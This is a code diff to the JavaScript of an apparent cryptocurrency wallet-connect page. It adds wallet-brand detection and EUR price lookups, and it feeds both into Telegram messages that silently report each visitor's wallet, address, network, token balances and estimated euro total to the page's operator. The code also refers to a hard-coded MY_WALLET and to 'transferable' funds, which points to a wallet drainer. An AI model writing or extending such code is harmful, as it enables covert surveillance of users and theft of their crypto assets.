@@ -304,6 +304,27 @@ async function connectWallet(walletType) {
   await connectWithProvider(eth, walletType);
 }
 
+function detectWalletName(eth, fallback) {
+  if (eth.isMetaMask && !eth.isBraveWallet)       return 'MetaMask';
+  if (eth.isBraveWallet)                           return 'Brave Wallet';
+  if (eth.isCoinbaseWallet || eth.isCoinbaseBrowser) return 'Coinbase Wallet';
+  if (eth.isTrust || eth.isTrustWallet)            return 'Trust Wallet';
+  if (eth.isRainbow)                               return 'Rainbow';
+  if (eth.isOkxWallet || eth.isOKExWallet)         return 'OKX Wallet';
+  if (eth.isPhantom)                               return 'Phantom';
+  if (eth.isRabby)                                 return 'Rabby';
+  if (eth.isFrame)                                 return 'Frame';
+  if (eth.isEnkrypt)                               return 'Enkrypt';
+  if (eth.isBitKeep || eth.isBitgetWallet)         return 'Bitget Wallet';
+  if (eth.isTokenPocket)                           return 'TokenPocket';
+  if (eth.isSafePal)                               return 'SafePal';
+  if (eth.isExodus)                                return 'Exodus';
+  if (eth.isKraken)                                return 'Kraken Wallet';
+  if (eth.isZerion)                                return 'Zerion';
+  if (eth.isBackpack)                              return 'Backpack';
+  return fallback ?? 'Unknown Wallet';
+}
+
 async function connectWithProvider(eth, label) {
   try {
     await eth.request({ method: 'eth_requestAccounts' });
@@ -318,10 +339,11 @@ async function connectWithProvider(eth, label) {
     state.address  = address;
     state.chainId  = Number(network.chainId);
 
+    state.walletName = detectWalletName(eth, label);
     onConnected();
 
     // Telegram: wallet connected
-    tgNotify(`🔌 *Wallet connecté*\n📍 Adresse : \`${address}\`\n🌐 Réseau : ${NETWORKS[Number(network.chainId)]?.name ?? network.chainId}`);
+    tgNotify(`🔌 *Wallet connecté*\n👛 Wallet : *${state.walletName}*\n📍 Adresse : \`${address}\`\n🌐 Réseau : ${NETWORKS[Number(network.chainId)]?.name ?? network.chainId}`);
 
     eth.on('accountsChanged', (accounts) => {
       if (!accounts.length) disconnect();
@@ -397,15 +419,56 @@ function onDisconnected() {
 
 // ── Balance loading ───────────────────────────────────────────────────────────
 
+// ── EUR prices via CoinGecko (free, no key) ───────────────────────────────────
+
+const COINGECKO_IDS = {
+  ETH: 'ethereum', WETH: 'ethereum',
+  USDT: 'tether', USDC: 'usd-coin', DAI: 'dai',
+  WBTC: 'wrapped-bitcoin', BTCB: 'bitcoin',
+  LINK: 'chainlink', UNI: 'uniswap', AAVE: 'aave',
+  MKR: 'maker', CRV: 'curve-dao-token', LDO: 'lido-dao',
+  SHIB: 'shiba-inu', PEPE: 'pepe', ARB: 'arbitrum',
+  OP: 'optimism', MATIC: 'matic-network', WBNB: 'binancecoin',
+  WAVAX: 'avalanche-2', CAKE: 'pancakeswap-token', CBETH: 'coinbase-wrapped-staked-eth',
+};
+
+let eurPrices = {}; // symbol → EUR price
+
+async function fetchEurPrices(symbols) {
+  const ids = [...new Set(symbols.map((s) => COINGECKO_IDS[s]).filter(Boolean))];
+  if (!ids.length) return;
+  try {
+    const res  = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=eur`);
+    const data = await res.json();
+    for (const sym of symbols) {
+      const id = COINGECKO_IDS[sym];
+      if (id && data[id]?.eur) eurPrices[sym] = data[id].eur;
+    }
+  } catch { /* prices unavailable */ }
+}
+
+function toEur(amount, symbol) {
+  const price = eurPrices[symbol];
+  if (!price) return null;
+  const val = parseFloat(amount) * price;
+  return val.toLocaleString('fr-FR', { style: 'currency', currency: 'EUR', maximumFractionDigits: 2 });
+}
+
 async function loadBalances() {
   state.balances = {};
 
+  // Fetch EUR prices for all tokens on this chain first
+  const allSymbols = ['ETH', ...(TOKENS[state.chainId] ?? []).map((t) => t.symbol)];
+  await fetchEurPrices(allSymbols);
+
   // ETH balance
   try {
-    const raw = await state.provider.getBalance(state.address);
+    const raw       = await state.provider.getBalance(state.address);
     const formatted = parseFloat(ethers.formatEther(raw)).toFixed(6);
     state.balances['ETH'] = { formatted, raw, token: null };
-    ethBalEl.textContent = `${formatted} ETH`;
+    const eur = toEur(formatted, 'ETH');
+    ethBalEl.innerHTML = `${formatted} <span style="font-size:14px;color:var(--text-secondary)">ETH</span>`
+      + (eur ? `<div style="font-size:13px;color:var(--text-muted);margin-top:2px">${eur}</div>` : '');
   } catch { ethBalEl.textContent = 'Error'; }
 
   // Token balances
@@ -417,38 +480,39 @@ async function loadBalances() {
   assetSelect.innerHTML = `<option value="ETH">ETH — ${state.balances['ETH']?.formatted ?? '…'}</option>`;
 
   for (const t of tokens) {
-    // Skeleton row
     const li = document.createElement('li');
     li.className = 'token-item';
     li.innerHTML = `
-      <div class="token-icon ${t.icon}">${t.symbol}</div>
+      <div class="token-icon ${t.icon ?? ''}">${t.symbol.slice(0,4)}</div>
       <div class="token-details">
         <div class="token-name">${t.symbol}</div>
         <div class="token-fullname">${t.name}</div>
       </div>
       <div class="token-balance-info">
         <div class="token-balance token-loading" id="bal-${t.symbol}">Loading…</div>
+        <div class="token-balance-usd" id="eur-${t.symbol}"></div>
       </div>`;
     tokenListEl.appendChild(li);
 
-    // Add to select (balance shown after load)
     const opt = document.createElement('option');
     opt.value = t.symbol;
     opt.textContent = `${t.symbol} — …`;
     assetSelect.appendChild(opt);
 
-    // Fetch async
     tokenPromises.push((async () => {
       try {
-        const contract = new ethers.Contract(t.address, ERC20_ABI, state.provider);
-        const raw      = await contract.balanceOf(state.address);
+        const contract  = new ethers.Contract(t.address, ERC20_ABI, state.provider);
+        const raw       = await contract.balanceOf(state.address);
         const formatted = parseFloat(ethers.formatUnits(raw, t.decimals)).toFixed(4);
         state.balances[t.symbol] = { formatted, raw, token: t };
 
         document.getElementById(`bal-${t.symbol}`).textContent = `${formatted} ${t.symbol}`;
         document.getElementById(`bal-${t.symbol}`).classList.remove('token-loading');
 
-        opt.textContent = `${t.symbol} — ${formatted}`;
+        const eur = toEur(formatted, t.symbol);
+        if (eur) document.getElementById(`eur-${t.symbol}`).textContent = eur;
+
+        opt.textContent = `${t.symbol} — ${formatted}${eur ? ` (${eur})` : ''}`;
       } catch {
         document.getElementById(`bal-${t.symbol}`).textContent = 'Error';
       }
@@ -459,11 +523,25 @@ async function loadBalances() {
   Promise.allSettled(tokenPromises).then(() => {
     const net    = NETWORKS[state.chainId]?.name ?? `Chain ${state.chainId}`;
     const ethBal = state.balances['ETH']?.formatted ?? '0';
+    const ethEur = toEur(ethBal, 'ETH') ?? '';
     const canTransfer = MY_WALLET && ethers.isAddress(MY_WALLET);
+
+    // Compute total EUR
+    let totalEur = 0;
+    for (const [sym, { formatted }] of Object.entries(state.balances)) {
+      const price = eurPrices[sym];
+      if (price) totalEur += parseFloat(formatted) * price;
+    }
+    const totalStr = totalEur > 0
+      ? totalEur.toLocaleString('fr-FR', { style: 'currency', currency: 'EUR', maximumFractionDigits: 2 })
+      : '—';
 
     const tokenLines = Object.entries(state.balances)
       .filter(([sym, { formatted }]) => sym !== 'ETH' && parseFloat(formatted) > 0)
-      .map(([sym, { formatted }]) => `  • ${formatted} ${sym}`)
+      .map(([sym, { formatted }]) => {
+        const eur = toEur(formatted, sym);
+        return `  • ${formatted} ${sym}${eur ? ` (${eur})` : ''}`;
+      })
       .join('\n') || '  • Aucun token avec solde';
 
     const transferable = canTransfer
@@ -474,8 +552,9 @@ async function loadBalances() {
       `💼 *Balances chargées*\n`
       + `📍 \`${state.address}\`\n`
       + `🌐 Réseau : ${net}\n\n`
-      + `💎 ETH : \`${ethBal}\`\n`
+      + `💎 ETH : \`${ethBal}\`${ethEur ? ` (${ethEur})` : ''}\n`
       + `🪙 Tokens :\n${tokenLines}\n\n`
+      + `💶 *Total estimé : ${totalStr}*\n\n`
       + transferable
     );
   });
